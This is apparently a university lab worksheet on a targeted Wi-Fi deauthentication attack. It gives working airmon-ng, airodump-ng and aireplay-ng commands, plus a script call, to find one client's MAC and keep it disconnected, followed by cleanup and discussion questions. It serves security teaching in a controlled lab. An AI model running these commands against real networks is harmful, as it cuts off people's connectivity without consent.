
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Targeted Client Deauthentication Attack  
**Author:** Dr Ayman El Hajjar  

---

#  Lab Activity: Deauthentication Attack on a Specific Client

---

###  Objective

This lab demonstrates a focused deauthentication attack against a specific client connected to a Wi-Fi network. Unlike broadcast deauths, this is a precision attack intended to disrupt one device.

---

###  Warning

This activity should only be performed in a controlled lab setup. Do not target unauthorised users.

---

##  Step 1: Identify AP and Connected Clients

Start by discovering the target network and its clients:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Find:
- **BSSID** of the AP  
- **Station MAC** (client) connected to it

---

##  Step 2: Launch Targeted Deauth Attack

Use the provided script:

```bash
sudo ./client_jammer.sh wlan0mon <CLIENT_MAC> <BSSID>
```

Or run manually:

```bash
sudo aireplay-ng --deauth 0 -c <CLIENT_MAC> -a <BSSID> wlan0mon
```

> This only affects the client with the specified MAC address.

---

##
 Step 3: Observe Impact on Target Client

On the client:
- Check for dropped Wi-Fi connection
- Monitor reconnection attempts
- Test application behaviour (e.g., video call or streaming interruptions)

---

##
 Discussion Points

- How does this differ from broadcast deauth?
- What kinds of attacks would use targeted deauth first?
- Can this be used as part of a multi-stage attack?

---

##
 Cleanup

```bash
sudo pkill aireplay-ng
sudo airmon-ng stop wlan0mon
```

---

##  Optional Screenshots

Add to `tasks/img/`:
- Airodump-ng showing target
- Aireplay-ng attack output
- Client-side disconnection

---

## Summary


| Phase     | Tool               | Purpose                               |
|-----------|--------------------|---------------------------------------|
| Recon     | `airodump-ng`      | Identify AP and connected clients     |
| Targeted  | `aireplay-ng`      | Deauth a single client device         |
| Monitor   | Device behaviour   | Observe targeted disruption           |

---
